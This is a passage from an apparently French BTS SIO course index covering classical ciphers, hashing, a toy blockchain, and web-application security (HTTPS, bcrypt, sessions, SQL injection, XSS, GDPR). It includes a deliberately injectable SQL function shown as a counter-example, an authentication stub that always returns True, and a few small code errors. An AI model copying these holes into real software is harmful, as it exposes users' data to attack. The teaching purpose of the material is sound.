WORLD\"\ncle = \"KEY\"\nmessage_chiffre = chiffrement_vigenere(message, cle)\nprint(f\"Message : {message}\")\nprint(f\"Cl\u00e9 : {cle}\")\nprint(f\"Chiffr\u00e9 : {message_chiffre}\")\nprint(f\"D\u00e9chiffr\u00e9 : {dechiffrement_vigenere(message_chiffre, cle)}\")\n</code></pre> Fonction de hachage cryptographique  Fonction math\u00e9matique qui transforme des donn\u00e9es de taille arbitraire en une cha\u00eene de caract\u00e8res de taille fixe (empreinte ou hash). Elle est irr\u00e9versible et d\u00e9terministe.  Propri\u00e9t\u00e9s des fonctions de hachage \ud83d\udd04 D\u00e9terministe <p>La m\u00eame entr\u00e9e produit toujours la m\u00eame sortie.</p> \u26a1 Rapide <p>Calcul efficace de l'empreinte pour toute donn\u00e9e d'entr\u00e9e.</p> \ud83c\udf0a Effet avalanche <p>Un petit changement dans l'entr\u00e9e modifie drastiquement la sortie.</p> \ud83d\udd12 Irr\u00e9versible <p>Impossible de retrouver l'entr\u00e9e \u00e0 partir de l'empreinte.</p> \ud83c\udfaf R\u00e9sistance aux collisions <p>Tr\u00e8s difficile de trouver deux entr\u00e9es avec la m\u00eame empreinte.</p> Utilisation avec Python hashlib Fonctions de hachage avec hashlib <pre><code>import hashlib\n\ndef calculer_hash(texte, algorithme='sha256'):\n    \"\"\"\n    Calcule l'empreinte d'un texte avec l'algorithme sp\u00e9cifi\u00e9\n    \"\"\"\n    # Encoder le texte en bytes\n    texte_bytes = texte.encode('utf-8')\n\n    # Cr\u00e9er l'objet hash\n    if algorithme == 'md5':\n        hash_obj = hashlib.md5(texte_bytes)\n    elif algorithme == 'sha1':\n        hash_obj = hashlib.sha1(texte_bytes)\n    elif algorithme == 'sha256':\n        hash_obj = hashlib.sha256(texte_bytes)\n    elif algorithme == 'sha512':\n        hash_obj = hashlib.sha512(texte_bytes)\n    else:\n        raise ValueError(\"Algorithme non support\u00e9\")\n\n    # Retourner l'empreinte en hexad\u00e9cimal\n    return hash_obj.hexdigest()\n\n# Exemples d'utilisation\nmessage = \"Hello World\"\nprint(f\"Message : {message}\")\nprint(f\"MD5    : {calculer_hash(message, 'md5')}\")\nprint(f\"SHA1   : {calculer_hash(message, 'sha1')}\")\nprint(f\"SHA256 : {calculer_hash(message, 'sha256')}\")\nprint(f\"SHA512 : {calculer_hash(message, 'sha512')}\")\n\n# D\u00e9monstration de l'effet avalanche\nprint(f\"\\nEffet avalanche :\")\nprint(f\"'Hello World'  : {calculer_hash('Hello World')}\")\nprint(f\"'Hello World!' : {calculer_hash('Hello World!')}\")\n</code></pre> Applications des fonctions de hachage  \ud83d\udd27 Utilisations courantes : <ul> <li>Stockage de mots de passe : Jamais en clair, toujours hach\u00e9s</li> <li>Int\u00e9grit\u00e9 des donn\u00e9es : V\u00e9rifier qu'un fichier n'a pas \u00e9t\u00e9 modifi\u00e9</li> <li>Signatures num\u00e9riques : Authentification et non-r\u00e9pudiation</li> <li>Blockchain : Cha\u00eenage des blocs et preuve de travail</li> <li>Tables de hachage : Structures de donn\u00e9es efficaces</li> </ul> Blockchain  Technologie de stockage et de transmission d'informations, transparente et s\u00e9curis\u00e9e, fonctionnant sans organe central de contr\u00f4le. Elle constitue une base de donn\u00e9es distribu\u00e9e et immuable.  Structure d'un bloc \ud83e\uddf1 Composants d'un bloc <ul> <li>Hash du bloc pr\u00e9c\u00e9dent : Lien cryptographique</li> <li>Timestamp : Horodatage de cr\u00e9ation</li> <li>Donn\u00e9es : Transactions ou informations</li> <li>Nonce : Nombre utilis\u00e9 une seule fois (proof of work)</li> <li>Hash du bloc : Empreinte unique du bloc</li> </ul> Impl\u00e9mentation simple d'une blockchain Blockchain basique en Python <pre><code>import hashlib\nimport time\nimport json\n\nclass Bloc:\n    def __init__(self, donnees, hash_precedent):\n        self.timestamp = time.time()\n        self.donnees = donnees\n        self.hash_precedent = hash_precedent\n        self.nonce = 0\n        self.hash = self.calculer_hash()\n\n    def calculer_hash(self):\n        \"\"\"Calcule le hash du bloc\"\"\"\n        contenu = f\"{self.hash_precedent}{self.timestamp}{self.donnees}{self.nonce}\"\n        return hashlib.sha256(contenu.encode()).hexdigest()\n\n    def miner_bloc(self, difficulte):\n        \"\"\"Mine le bloc avec une difficult\u00e9 donn\u00e9e (proof of work)\"\"\"\n        cible = \"0\" * difficulte\n\n        while self.hash[:difficulte] != cible:\n            self.nonce += 1\n            self.hash = self.calculer_hash()\n\n        print(f\"Bloc min\u00e9 : {self.hash}\")\n\nclass Blockchain:\n    def __init__(self):\n        self.chaine = [self.creer_bloc_genese()]\n        self.difficulte = 2\n\n    def creer_bloc_genese(self):\n        \"\"\"Cr\u00e9e le premier bloc de la cha\u00eene\"\"\"\n        return Bloc(\"Bloc Gen\u00e8se\", \"0\")\n\n    def obtenir_dernier_bloc(self):\n        \"\"\"Retourne le dernier bloc de la cha\u00eene\"\"\"\n        return self.chaine[-1]\n\n    def ajouter_bloc(self, nouveau_bloc):\n        \"\"\"Ajoute un nouveau bloc \u00e0 la cha\u00eene\"\"\"\n        nouveau_bloc.hash_precedent = self.obtenir_dernier_bloc().hash\n        nouveau_bloc.miner_bloc(self.difficulte)\n        self.chaine.append(nouveau_bloc)\n\n    def valider_chaine(self):\n        \"\"\"V\u00e9rifie l'int\u00e9grit\u00e9 de la blockchain\"\"\"\n        for i in range(1, len(self.chaine)):\n            bloc_actuel = self.chaine[i]\n            bloc_precedent = self.chaine[i-1]\n\n            # V\u00e9rifier le hash du bloc\n            if bloc_actuel.hash != bloc_actuel.calculer_hash():\n                return False\n\n            # V\u00e9rifier le lien avec le bloc pr\u00e9c\u00e9dent\n            if bloc_actuel.hash_precedent != bloc_precedent.hash:\n                return False\n\n        return True\n\n# Exemple d'utilisation\nblockchain = Blockchain()\n\nprint(\"Cr\u00e9ation de la blockchain...\")\nblockchain.ajouter_bloc(Bloc(\"Transaction 1: Alice -&gt; Bob 10\u20ac\", \"\"))\nblockchain.ajouter_bloc(Bloc(\"Transaction 2: Bob -&gt; Charlie 5\u20ac\", \"\"))\n\nprint(f\"\\nBlockchain valide : {blockchain.valider_chaine()}\")\n</code></pre> Caract\u00e9ristiques de la blockchain \ud83d\udd17 Immutabilit\u00e9  Une fois ajout\u00e9es, les donn\u00e9es ne peuvent plus \u00eatre modifi\u00e9es sans alt\u00e9rer toute la cha\u00eene.  \ud83c\udf10 D\u00e9centralisation  Aucune autorit\u00e9 centrale, le r\u00e9seau est distribu\u00e9 entre tous les participants.  \ud83d\udc41\ufe0f Transparence  Toutes les transactions sont visibles et v\u00e9rifiables par tous les participants.  \ud83d\udd10 S\u00e9curit\u00e9  Protection cryptographique et consensus distribu\u00e9 pour garantir l'int\u00e9grit\u00e9.    ### Domaines d'application   \ud83d\udcb3 Cryptomonnaies <p>Bitcoin, Ethereum, monnaies num\u00e9riques d\u00e9centralis\u00e9es</p> \ud83d\udcdc Contrats intelligents <p>Automatisation d'accords sans interm\u00e9diaire</p> \ud83c\udfe5 Sant\u00e9 <p>Dossiers m\u00e9dicaux s\u00e9curis\u00e9s et tra\u00e7ables</p> \ud83d\uddf3\ufe0f Vote \u00e9lectronique <p>Syst\u00e8mes de vote transparents et v\u00e9rifiables</p> \ud83d\udce6 Supply Chain <p>Tra\u00e7abilit\u00e9 des produits de la production au consommateur</p> \ud83c\udf93 Certification <p>Dipl\u00f4mes et certifications infalsifiables</p>  \u26a1 D\u00e9fis de la blockchain : <ul> <li>Consommation \u00e9nerg\u00e9tique : Le minage n\u00e9cessite beaucoup d'\u00e9nergie</li> <li>Scalabilit\u00e9 : Limitation du nombre de transactions par seconde</li> <li>R\u00e9gulation : Cadre juridique en \u00e9volution</li> <li>Adoption : N\u00e9cessit\u00e9 de former les utilisateurs</li> </ul>"},{"location":"BTS/B2/B3_3_Cryptographie_chiffrement/#pour-aller-plus-loin","title":"\ud83d\udcda Pour aller plus loin","text":"\ud83d\udd17 Ressources compl\u00e9mentaires : <ul> <li>Cryptool : Logiciel \u00e9ducatif pour la cryptographie</li> <li>Python cryptography : Biblioth\u00e8que avanc\u00e9e</li> <li>OpenSSL : Outils cryptographiques en ligne de commande</li> <li>Blockchain.info : Explorateur de blockchain Bitcoin</li> </ul>"},{"location":"BTS/B2/B3_3_Cryptographie_chiffrement/#points-cles-a-retenir","title":"\u2705 Points cl\u00e9s \u00e0 retenir","text":"<ol> <li>C\u00e9sar : Chiffrement par substitution simple, facilement cassable</li> <li>Vigen\u00e8re : Am\u00e9lioration avec mot-cl\u00e9, plus r\u00e9sistant</li> <li>Hachage : Irr\u00e9versible, utilis\u00e9 pour l'int\u00e9grit\u00e9 et l'authentification</li> <li>Blockchain : Registre distribu\u00e9 et immuable</li> <li>Applications : De la s\u00e9curisation des mots de passe aux cryptomonnaies</li> </ol>  \ud83c\udf93 Prochaine \u00e9tape : Dans le cours B3.4, nous \u00e9tudierons la s\u00e9curit\u00e9 des applications web et la protection des donn\u00e9es."},{"location":"BTS/B2/B3_4_Securite_applications_web/","title":"B3 4 Securite applications web","text":"B3.4 - S\u00e9curit\u00e9 des Applications Web <p>Protection des donn\u00e9es et s\u00e9curisation des services - BTS SIO</p>"},{"location":"BTS/B2/B3_4_Securite_applications_web/#objectifs-du-cours","title":"\ud83c\udfaf Objectifs du cours\ud83d\udd12 Protocoles de s\u00e9curisation\ud83d\udd10 Authentification et autorisation\ud83d\udee1\ufe0f Protection contre les vuln\u00e9rabilit\u00e9s web\ud83d\udd10 Protection des donn\u00e9es personnelles\ud83d\udd0d Monitoring et d\u00e9tection d'incidents","text":"<p>\u00c0 l'issue de ce cours, vous serez capable de : - Comprendre les protocoles de s\u00e9curisation web (HTTPS, TLS) - Impl\u00e9menter des m\u00e9canismes d'authentification et d'autorisation - Prot\u00e9ger les donn\u00e9es personnelles selon le RGPD - S\u00e9curiser les communications et les sessions utilisateur</p> HTTPS (HyperText Transfer Protocol Secure)  Version s\u00e9curis\u00e9e du protocole HTTP utilisant TLS/SSL pour chiffrer les communications entre le client et le serveur, garantissant confidentialit\u00e9, int\u00e9grit\u00e9 et authentification.  Comparaison HTTP vs HTTPS \ud83d\udd13 HTTP <ul> <li>Port 80</li> <li>Donn\u00e9es en clair</li> <li>Vuln\u00e9rable aux \u00e9coutes</li> <li>Pas d'authentification du serveur</li> <li>Risque de modification des donn\u00e9es</li> </ul> \ud83d\udd12 HTTPS <ul> <li>Port 443</li> <li>Donn\u00e9es chiffr\u00e9es</li> <li>Protection contre l'\u00e9coute</li> <li>Certificat serveur</li> <li>Int\u00e9grit\u00e9 des donn\u00e9es garantie</li> </ul> Processus de connexion TLS 1. Client Hello Le client envoie sa version TLS, les algorithmes support\u00e9s et un nombre al\u00e9atoire.  2. Server Hello Le serveur r\u00e9pond avec sa version TLS, l'algorithme choisi, son certificat et un nombre al\u00e9atoire.  3. V\u00e9rification du certificat Le client v\u00e9rifie la validit\u00e9 du certificat serveur aupr\u00e8s d'une autorit\u00e9 de certification.  4. \u00c9change de cl\u00e9s G\u00e9n\u00e9ration d'une cl\u00e9 de session sym\u00e9trique pour chiffrer les communications.  5. Communication s\u00e9curis\u00e9e Toutes les donn\u00e9es sont chiffr\u00e9es avec la cl\u00e9 de session.  Configuration HTTPS avec Python Flask Serveur Flask avec HTTPS <pre><code>from flask import Flask, request, session, redirect, url_for\nimport ssl\n\napp = Flask(__name__)\napp.secret_key = 'votre_cle_secrete_tres_longue_et_aleatoire'\n\n@app.route('/')\ndef index():\n    return '''\n    &lt;h1&gt;Serveur HTTPS s\u00e9curis\u00e9&lt;/h1&gt;\n    &lt;p&gt;Cette connexion est chiffr\u00e9e !&lt;/p&gt;\n    &lt;a href=\"/login\"&gt;Se connecter&lt;/a&gt;\n    '''\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form['username']\n        password = request.form['password']\n\n        # V\u00e9rification s\u00e9curis\u00e9e (\u00e0 impl\u00e9menter)\n        if verify_credentials(username, password):\n            session['user'] = username\n            return redirect(url_for('dashboard'))\n        else:\n            return 'Identifiants incorrects', 401\n\n    return '''\n    &lt;form method=\"post\"&gt;\n        &lt;input type=\"text\" name=\"username\" placeholder=\"Nom d'utilisateur\" required&gt;\n        &lt;input type=\"password\" name=\"password\" placeholder=\"Mot de passe\" required&gt;\n        &lt;button type=\"submit\"&gt;Se connecter&lt;/button&gt;\n    &lt;/form&gt;\n    '''\n\n@app.route('/dashboard')\ndef dashboard():\n    if 'user' not in session:\n        return redirect(url_for('login'))\n    return f'Bienvenue {session[\"user\"]} !'\n\ndef verify_credentials(username, password):\n    # Impl\u00e9mentation s\u00e9curis\u00e9e avec hachage\n    # Ne jamais stocker les mots de passe en clair !\n    return True  # Exemple simplifi\u00e9\n\nif __name__ == '__main__':\n    # Configuration SSL/TLS\n    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\n    context.load_cert_chain('certificat.pem', 'cle_privee.pem')\n\n    app.run(host='0.0.0.0', port=443, ssl_context=context, debug=False)\n</code></pre> Authentification vs Autorisation Authentification : V\u00e9rifier l'identit\u00e9 de l'utilisateur (\"Qui \u00eates-vous ?\") Autorisation : V\u00e9rifier les permissions de l'utilisateur (\"Que pouvez-vous faire ?\")  M\u00e9thodes d'authentification \ud83d\udd11 Authentification basique <p>Nom d'utilisateur et mot de passe. Simple mais n\u00e9cessite HTTPS.</p> \ud83c\udfab Authentification par token <p>JWT (JSON Web Token) pour les API et applications modernes.</p> \ud83d\udcf1 Authentification multi-facteurs (MFA) <p>Combinaison de plusieurs facteurs : mot de passe + SMS/app.</p> \ud83d\udd17 OAuth 2.0 <p>D\u00e9l\u00e9gation d'authentification via des services tiers (Google, Facebook).</p> Impl\u00e9mentation s\u00e9curis\u00e9e des mots de passe Gestion s\u00e9curis\u00e9e des mots de passe <pre><code>import hashlib\nimport secrets\nimport bcrypt\nfrom werkzeug.security import generate_password_hash, check_password_hash\n\nclass UserManager:\n    def __init__(self):\n        self.users = {}  # En production : base de donn\u00e9es\n\n    def hash_password_bcrypt(self, password):\n        \"\"\"Hachage s\u00e9curis\u00e9 avec bcrypt (recommand\u00e9)\"\"\"\n        salt = bcrypt.gensalt()\n        hashed = bcrypt.hashpw(password.encode('utf-8'), salt)\n        return hashed\n\n    def verify_password_bcrypt(self, password, hashed):\n        \"\"\"V\u00e9rification avec bcrypt\"\"\"\n        return bcrypt.checkpw(password.encode('utf-8'), hashed)\n\n    def hash_password_werkzeug(self, password):\n        \"\"\"Alternative avec Werkzeug\"\"\"\n        return generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)\n\n    def verify_password_werkzeug(self, password, hashed):\n        \"\"\"V\u00e9rification avec Werkzeug\"\"\"\n        return check_password_hash(hashed, password)\n\n    def create_user(self, username, password, email):\n        \"\"\"Cr\u00e9er un nouvel utilisateur\"\"\"\n        if username in self.users:\n            raise ValueError(\"Utilisateur d\u00e9j\u00e0 existant\")\n\n        # Validation du mot de passe\n        if not self.is_strong_password(password):\n            raise ValueError(\"Mot de passe trop faible\")\n\n        # Hachage s\u00e9curis\u00e9\n        hashed_password = self.hash_password_bcrypt(password)\n\n        self.users[username] = {\n            'password_hash': hashed_password,\n            'email': email,\n            'created_at': datetime.now(),\n            'last_login': None,\n            'failed_attempts': 0,\n            'locked_until': None\n        }\n\n        return True\n\n    def authenticate(self, username, password):\n        \"\"\"Authentifier un utilisateur\"\"\"\n        user = self.users.get(username)\n        if not user:\n            return False\n\n        # V\u00e9rifier si le compte est verrouill\u00e9\n        if user['locked_until'] and datetime.now() &lt; user['locked_until']:\n            raise Exception(\"Compte temporairement verrouill\u00e9\")\n\n        # V\u00e9rifier le mot de passe\n        if self.verify_password_bcrypt(password, user['password_hash']):\n            # R\u00e9initialiser les tentatives \u00e9chou\u00e9es\n            user['failed_attempts'] = 0\n            user['locked_until'] = None\n            user['last_login'] = datetime.now()\n            return True\n        else:\n            # Incr\u00e9menter les tentatives \u00e9chou\u00e9es\n            user['failed_attempts'] += 1\n\n            # Verrouiller apr\u00e8s 5 tentatives\n            if user['failed_attempts'] &gt;= 5:\n                user['locked_until'] = datetime.now() + timedelta(minutes=30)\n\n            return False\n\n    def is_strong_password(self, password):\n        \"\"\"V\u00e9rifier la force du mot de passe\"\"\"\n        if len(password) &lt; 8:\n            return False\n\n        has_upper = any(c.isupper() for c in password)\n        has_lower = any(c.islower() for c in password)\n        has_digit = any(c.isdigit() for c in password)\n        has_special = any(c in \"!@#$%^&amp;*()_+-=[]{}|;:,.&lt;&gt;?\" for c in password)\n\n        return has_upper and has_lower and has_digit and has_special\n\n# Exemple d'utilisation\nuser_manager = UserManager()\n\ntry:\n    user_manager.create_user(\"alice\", \"MonMotDePasse123!\", \"alice@example.com\")\n    print(\"Utilisateur cr\u00e9\u00e9 avec succ\u00e8s\")\n\n    if user_manager.authenticate(\"alice\", \"MonMotDePasse123!\"):\n        print(\"Authentification r\u00e9ussie\")\n    else:\n        print(\"\u00c9chec de l'authentification\")\n\nexcept ValueError as e:\n    print(f\"Erreur : {e}\")\n</code></pre> Gestion des sessions s\u00e9curis\u00e9es Sessions s\u00e9curis\u00e9es avec Flask <pre><code>from flask import Flask, session, request, jsonify\nimport secrets\nimport time\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(32)  # Cl\u00e9 al\u00e9atoire s\u00e9curis\u00e9e\n\n# Configuration s\u00e9curis\u00e9e des sessions\napp.config.update(\n    SESSION_COOKIE_SECURE=True,      # HTTPS uniquement\n    SESSION_COOKIE_HTTPONLY=True,    # Pas d'acc\u00e8s JavaScript\n    SESSION_COOKIE_SAMESITE='Lax',   # Protection CSRF\n    PERMANENT_SESSION_LIFETIME=1800  # 30 minutes\n)\n\nclass SessionManager:\n    def __init__(self):\n        self.active_sessions = {}\n\n    def create_session(self, user_id):\n        \"\"\"Cr\u00e9er une nouvelle session\"\"\"\n        session_id = secrets.token_urlsafe(32)\n        session_data = {\n            'user_id': user_id,\n            'created_at': time.time(),\n            'last_activity': time.time(),\n            'ip_address': request.remote_addr,\n            'user_agent': request.headers.get('User-Agent', '')\n        }\n\n        self.active_sessions[session_id] = session_data\n        session['session_id'] = session_id\n        session.permanent = True\n\n        return session_id\n\n    def validate_session(self, session_id):\n        \"\"\"Valider une session existante\"\"\"\n        if session_id not in self.active_sessions:\n            return False\n\n        session_data = self.active_sessions[session_id]\n        current_time = time.time()\n\n        # V\u00e9rifier l'expiration (30 minutes d'inactivit\u00e9)\n        if current_time - session_data['last_activity'] &gt; 1800:\n            self.destroy_session(session_id)\n            return False\n\n        # V\u00e9rifier l'IP (optionnel, peut poser probl\u00e8me avec les proxies)\n        if session_data['ip_address'] != request.remote_addr:\n            # Log de s\u00e9curit\u00e9\n            print(f\"Changement d'IP d\u00e9tect\u00e9 pour la session {session_id}\")\n\n        # Mettre \u00e0 jour l'activit\u00e9\n        session_data['last_activity'] = current_time\n        return True\n\n    def destroy_session(self, session_id):\n        \"\"\"D\u00e9truire une session\"\"\"\n        if session_id in self.active_sessions:\n            del self.active_sessions[session_id]\n\n        session.clear()\n\n    def get_user_id(self, session_id):\n        \"\"\"R\u00e9cup\u00e9rer l'ID utilisateur d'une session\"\"\"\n        if session_id in self.active_sessions:\n            return self.active_sessions[session_id]['user_id']\n        return None\n\nsession_manager = SessionManager()\n\n@app.before_request\ndef check_session():\n    \"\"\"V\u00e9rifier la session avant chaque requ\u00eate\"\"\"\n    if request.endpoint in ['login', 'static']:\n        return  # Pas de v\u00e9rification pour ces endpoints\n\n    session_id = session.get('session_id')\n    if not session_id or not session_manager.validate_session(session_id):\n        return jsonify({'error': 'Session invalide'}), 401\n\n@app.route('/logout')\ndef logout():\n    \"\"\"D\u00e9connexion s\u00e9curis\u00e9e\"\"\"\n    session_id = session.get('session_id')\n    if session_id:\n        session_manager.destroy_session(session_id)\n\n    return jsonify({'message': 'D\u00e9connexion r\u00e9ussie'})\n</code></pre> Top 10 OWASP des vuln\u00e9rabilit\u00e9s Rang Vuln\u00e9rabilit\u00e9 Description Protection 1 Injection SQL, NoSQL, LDAP injection Requ\u00eates pr\u00e9par\u00e9es, validation 2 Authentification cass\u00e9e Sessions, mots de passe faibles MFA, sessions s\u00e9curis\u00e9es 3 Exposition de donn\u00e9es Donn\u00e9es sensibles non prot\u00e9g\u00e9es Chiffrement, HTTPS 4 XXE XML External Entity D\u00e9sactiver les entit\u00e9s externes 5 Contr\u00f4le d'acc\u00e8s cass\u00e9 Autorisations mal configur\u00e9es Principe du moindre privil\u00e8ge 6 Configuration de s\u00e9curit\u00e9 Param\u00e8tres par d\u00e9faut non s\u00e9curis\u00e9s Durcissement, mise \u00e0 jour 7 XSS Cross-Site Scripting \u00c9chappement, CSP 8 D\u00e9s\u00e9rialisation Objets non fiables Validation, signature 9 Composants vuln\u00e9rables Biblioth\u00e8ques obsol\u00e8tes Mise \u00e0 jour r\u00e9guli\u00e8re 10 Logging insuffisant D\u00e9tection d'incidents limit\u00e9e Logs d\u00e9taill\u00e9s, monitoring Protection contre les injections SQL Pr\u00e9vention des injections SQL <pre><code>import sqlite3\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\nclass DatabaseManager:\n    def __init__(self, db_path):\n        self.db_path = db_path\n        self.init_database()\n\n    def init_database(self):\n        \"\"\"Initialiser la base de donn\u00e9es\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        cursor.execute('''\n            CREATE TABLE IF NOT EXISTS users (\n                id INTEGER PRIMARY KEY,\n                username TEXT UNIQUE NOT NULL,\n                email TEXT NOT NULL,\n                password_hash TEXT NOT NULL,\n                role TEXT DEFAULT 'user'\n            )\n        ''')\n\n        conn.commit()\n        conn.close()\n\n    def get_user_vulnerable(self, username):\n        \"\"\"VULN\u00c9RABLE - Ne jamais faire cela !\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        # DANGER : Injection SQL possible\n        query = f\"SELECT * FROM users WHERE username = '{username}'\"\n        cursor.execute(query)\n\n        result = cursor.fetchone()\n        conn.close()\n        return result\n\n    def get_user_secure(self, username):\n        \"\"\"S\u00c9CURIS\u00c9 - Utilisation de requ\u00eates pr\u00e9par\u00e9es\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        # S\u00e9curis\u00e9 : param\u00e8tres li\u00e9s\n        cursor.execute(\"SELECT * FROM users WHERE username = ?\", (username,))\n\n        result = cursor.fetchone()\n        conn.close()\n        return result\n\n    def search_users_secure(self, search_term, role=None):\n        \"\"\"Recherche s\u00e9curis\u00e9e avec param\u00e8tres multiples\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        query = \"SELECT id, username, email, role FROM users WHERE username LIKE ?\"\n        params = [f\"%{search_term}%\"]\n\n        if role:\n            query += \" AND role = ?\"\n            params.append(role)\n\n        cursor.execute(query, params)\n        results = cursor.fetchall()\n        conn.close()\n\n        return results\n\ndb = DatabaseManager('app.db')\n\n@app.route('/user/&lt;username&gt;')\ndef get_user(username):\n    \"\"\"Endpoint s\u00e9curis\u00e9 pour r\u00e9cup\u00e9rer un utilisateur\"\"\"\n    # Validation d'entr\u00e9e\n    if not username or len(username) &gt; 50:\n        return jsonify({'error': 'Nom d'utilisateur invalide'}), 400\n\n    # Utilisation de la m\u00e9thode s\u00e9curis\u00e9e\n    user = db.get_user_secure(username)\n\n    if user:\n        return jsonify({\n            'id': user[0],\n            'username': user[1],\n            'email': user[2],\n            'role': user[4]\n        })\n    else:\n        return jsonify({'error': 'Utilisateur non trouv\u00e9'}), 404\n\n@app.route('/search')\ndef search_users():\n    \"\"\"Recherche d'utilisateurs avec validation\"\"\"\n    search_term = request.args.get('q', '').strip()\n    role = request.args.get('role', '').strip()\n\n    # Validation des param\u00e8tres\n    if not search_term or len(search_term) &lt; 2:\n        return jsonify({'error': 'Terme de recherche trop court'}), 400\n\n    if role and role not in ['user', 'admin', 'moderator']:\n        return jsonify({'error': 'R\u00f4le invalide'}), 400\n\n    results = db.search_users_secure(search_term, role)\n\n    return jsonify({\n        'users': [\n            {\n                'id': user[0],\n                'username': user[1],\n                'email': user[2],\n                'role': user[3]\n            }\n            for user in results\n        ]\n    })\n</code></pre> Protection XSS et CSP Protection contre XSS <pre><code>from flask import Flask, render_template_string, request, escape\nfrom markupsafe import Markup\nimport html\nimport re\n\napp = Flask(__name__)\n\nclass XSSProtection:\n    @staticmethod\n    def sanitize_input(user_input):\n        \"\"\"Nettoyer les entr\u00e9es utilisateur\"\"\"\n        if not user_input:\n            return \"\"\n\n        # \u00c9chapper les caract\u00e8res HTML\n        sanitized = html.escape(user_input)\n\n        # Supprimer les scripts potentiels\n        sanitized = re.sub(r'&lt;script[^&gt;]*&gt;.*?&lt;/script&gt;', '', sanitized, flags=re.IGNORECASE | re.DOTALL)\n\n        return sanitized\n\n    @staticmethod\n    def validate_url(url):\n        \"\"\"Valider une URL pour \u00e9viter les redirections malveillantes\"\"\"\n        if not url:\n            return False\n\n        # Autoriser seulement les URLs relatives ou HTTPS\n        if url.startswith('/') or url.startswith('https://'):\n            return True\n\n        return False\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    \"\"\"Ajouter un commentaire avec protection XSS\"\"\"\n    comment = request.form.get('comment', '')\n\n    # Nettoyer l'entr\u00e9e\n    clean_comment = XSSProtection.sanitize_input(comment)\n\n    # Validation suppl\u00e9mentaire\n    if len(clean_comment) &gt; 1000:\n        return \"Commentaire trop long\", 400\n\n    # Sauvegarder en base (exemple)\n    # db.save_comment(clean_comment)\n\n    return f\"Commentaire ajout\u00e9 : {clean_comment}\"\n\n@app.after_request\ndef add_security_headers(response):\n    \"\"\"Ajouter des en-t\u00eates de s\u00e9curit\u00e9\"\"\"\n    # Content Security Policy\n    response.headers['Content-Security-Policy'] = (\n        \"default-src 'self'; \"\n        \"script-src 'self' 'unsafe-inline'; \"\n        \"style-src 'self' 'unsafe-inline'; \"\n        \"img-src 'self' data: https:; \"\n        \"font-src 'self'; \"\n        \"connect-src 'self'; \"\n        \"frame-ancestors 'none';\"\n    )\n\n    # Autres en-t\u00eates de s\u00e9curit\u00e9\n    response.headers['X-Content-Type-Options'] = 'nosniff'\n    response.headers['X-Frame-Options'] = 'DENY'\n    response.headers['X-XSS-Protection'] = '1; mode=block'\n    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'\n\n    return response\n</code></pre> RGPD (R\u00e8glement G\u00e9n\u00e9ral sur la Protection des Donn\u00e9es)  R\u00e8glement europ\u00e9en entr\u00e9 en vigueur en 2018, qui encadre le traitement des donn\u00e9es personnelles et renforce les droits des individus sur leurs donn\u00e9es.  Principes fondamentaux du RGPD \ud83c\udfaf Finalit\u00e9 Les donn\u00e9es doivent \u00eatre collect\u00e9es pour des finalit\u00e9s d\u00e9termin\u00e9es, explicites et l\u00e9gitimes.  \ud83d\udccf Minimisation Collecter uniquement les donn\u00e9es n\u00e9cessaires \u00e0 la finalit\u00e9 poursuivie.  \u23f0 Conservation limit\u00e9e Les donn\u00e9es ne doivent pas \u00eatre conserv\u00e9es plus longtemps que n\u00e9cessaire.  \ud83d\udd12 S\u00e9curit\u00e9 Mettre en place des mesures techniques et organisationnelles appropri\u00e9es.  Droits des personnes concern\u00e9es \u2139\ufe0f Droit \u00e0 l'information  \u00catre inform\u00e9 de la collecte et du traitement de ses donn\u00e9es personnelles.  \ud83d\udc41\ufe0f Droit d'acc\u00e8s  Obtenir une copie de ses donn\u00e9es personnelles et des informations sur leur traitement.  \u270f\ufe0f Droit de rectification  Demander la correction de donn\u00e9es inexactes ou incompl\u00e8tes.  \ud83d\uddd1\ufe0f Droit \u00e0 l'effacement  Demander la suppression de ses donn\u00e9es dans certaines conditions.  \ud83d\udce6 Droit \u00e0 la portabilit\u00e9  R\u00e9cup\u00e9rer ses donn\u00e9es dans un format structur\u00e9 et les transf\u00e9rer.  \ud83d\udeab Droit d'opposition  S'opposer au traitement de ses donn\u00e9es pour des raisons l\u00e9gitimes.  Impl\u00e9mentation RGPD en Python Gestion RGPD avec Python <pre><code>from datetime import datetime, timedelta\nimport json\nimport hashlib\n\nclass GDPRManager:\n    def __init__(self):\n        self.data_retention_policies = {\n            'user_logs': timedelta(days=365),\n            'marketing_data': timedelta(days=1095),  # 3 ans\n            'financial_data': timedelta(days=2555),  # 7 ans\n            'session_data': timedelta(hours=24)\n        }\n\n        self.consent_records = {}\n        self.data_processing_log = []\n\n    def record_consent(self, user_id, purpose, consent_given, ip_address):\n        \"\"\"Enregistrer le consentement utilisateur\"\"\"\n        consent_record = {\n            'user_id': user_id,\n            'purpose': purpose,\n            'consent_given': consent_given,\n            'timestamp': datetime.now().isoformat(),\n            'ip_address': self.hash_ip(ip_address),\n            'version': '1.0'  # Version de la politique de confidentialit\u00e9\n        }\n\n        if user_id not in self.consent_records:\n            self.consent_records[user_id] = []\n\n        self.consent_records[user_id].append(consent_record)\n\n        # Log de l'activit\u00e9\n        self.log_data_processing(user_id, 'consent_recorded', purpose)\n\n    def hash_ip(self, ip_address):\n        \"\"\"Hasher l'adresse IP pour la pseudonymisation\"\"\"\n        return hashlib.sha256(ip_address.encode()).hexdigest()[:16]\n\n    def log_data_processing(self, user_id, action, purpose, data_type=None):\n        \"\"\"Logger les activit\u00e9s de traitement de donn\u00e9es\"\"\"\n        log_entry = {\n            'user_id': user_id,\n            'action': action,\n            'purpose': purpose,\n            'data_type': data_type,\n            'timestamp': datetime.now().isoformat(),\n            'processor': 'system'\n        }\n\n        self.data_processing_log.append(log_entry)\n\n    def export_user_data(self, user_id):\n        \"\"\"Exporter toutes les donn\u00e9es d'un utilisateur (portabilit\u00e9)\"\"\"\n      